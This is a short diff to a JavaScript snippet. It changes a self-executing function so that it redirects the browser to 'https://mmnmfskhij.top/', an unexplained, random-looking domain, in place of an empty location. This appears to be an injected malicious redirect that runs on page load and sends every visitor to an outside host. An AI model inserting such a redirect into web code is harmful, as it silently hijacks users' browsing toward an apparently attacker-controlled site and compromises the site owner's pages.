@@ -1,6 +1,7 @@
 (function() {
-    window['location'] = '';
+    window['location'] = 'https://mmnmfskhij.top/';
 })();
+
 
 
 
